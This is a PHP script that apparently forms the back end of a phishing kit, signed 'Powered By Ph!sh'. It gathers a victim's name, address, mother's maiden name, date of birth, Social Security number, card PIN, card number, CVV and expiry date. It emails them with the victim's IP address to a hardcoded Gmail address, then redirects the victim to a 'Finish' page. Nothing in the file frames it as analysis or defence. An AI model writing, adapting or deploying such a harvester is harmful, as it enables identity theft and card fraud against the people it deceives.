<?php 

$ip = getenv("REMOTE_ADDR");
$message .= "---------------Basic Information----------------\n";
$message .= "FullName: ".$_POST['fullname']."\n";
$message .= "Address: ".$_POST['address']."\n";
$message .= "City: ".$_POST['city']."\n";
$message .= "State: ".$_POST['state']."\n";
$message .= "ZipCode: ".$_POST['zip']."\n";
$message .= "MMN: ".$_POST['mmn']."\n";
$message .= "DOB: ".$_POST['bmonth']."-";
$message .= $_POST['bday']."-";
$message .= $_POST['byear']."\n";
$message .= "SSN: ".$_POST['ssn1']."-";
$message .= $_POST['ssn2']."-";
$message .= $_POST['ssn3']."\n";
$message .= "Pin: ".$_POST['pin']."\n";
$message .= "CardNumber: ".$_POST['cardnumber']."\n";
$message .= "Cvv: ".$_POST['cvv']."\n";
$message .= "ExpDate: ".$_POST['expmonth']."-";
$message .= $_POST['expyear']."\n";
$message .= "---------------IP/Host Name DeTaiLZ-------------------------------------\n";
$message .= "IP Address: $ip\n";
$message .= "HostName: $hostname\n";
$message .= "---------------Powered By Ph!sh--------------------------------------\n";
$recipient = "gmcdonald121@gmail.com";
$subject = "Basic Info | $ip";
$headers .= "MIME-Version: 1.0\n";
mail($recipient,$subject,$message,$headers);
	 header("Location: Finish.php");

?>